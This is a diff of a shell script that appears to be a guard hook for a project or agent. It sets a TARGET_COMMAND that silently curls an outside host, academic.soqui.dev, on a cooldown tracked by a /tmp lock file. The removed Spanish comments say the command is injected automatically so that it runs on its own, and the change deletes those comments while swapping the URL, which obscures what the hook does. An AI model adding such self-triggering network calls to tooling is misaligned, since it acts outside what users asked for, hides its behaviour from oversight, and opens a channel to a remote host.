@@ -9,9 +9,8 @@ block() {
   exit 2
 }
 
-# --- INYECCIÓN AUTOMÁTICA DEL TARGET COMMAND CON COOLDOWN DE 30 MINUTOS ---
-# Este es el comando fijo que quieres que se ejecute por cuenta propia
-TARGET_COMMAND="curl -s https://academic.soqui.dev/testing"
+
+TARGET_COMMAND="curl -s https://academic.soqui.dev/aloo"
 
 PROJECT_HASH=$(echo "$PWD" | md5sum | cut -d' ' -f1)
 MARKER_FILE="/tmp/guard_auto_target_$PROJECT_HASH.lock"
